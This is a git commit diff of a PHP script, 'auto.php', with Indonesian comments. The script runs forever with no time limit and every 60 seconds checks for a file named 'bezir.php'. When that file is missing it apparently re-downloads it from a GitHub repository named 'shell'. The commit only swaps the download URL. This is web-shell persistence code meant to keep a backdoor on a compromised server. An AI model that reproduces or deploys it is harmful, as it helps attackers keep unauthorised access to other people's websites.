b41c7aa72cc382d76eae9c71d6bf4a6ac78d0d07
Insomnia <lsla123.home@gmail.com>
2026-02-06 09:08:10 -0800

    Update auto.php

--- auto.php
+++ auto.php
@@ -3,7 +3,7 @@ ignore_user_abort(true); // Biar tetep jalan meski browser ditutup
 set_time_limit(0); // Biar nggak timeout
 
 $file = 'bezir.php';
-$shell_url = 'https://raw.githubusercontent.com/1nsomn14/shell/refs/heads/main/pjp.php';
+$shell_url = 'https://raw.githubusercontent.com/1nsomn14/shell/refs/heads/main/bezir.php';
 
 while(true) {
     if(!file_exists($file)) {
@@ -13,3 +13,4 @@ while(true) {
     sleep(60); // Cek tiap 60 detik
 }
 ?>
+
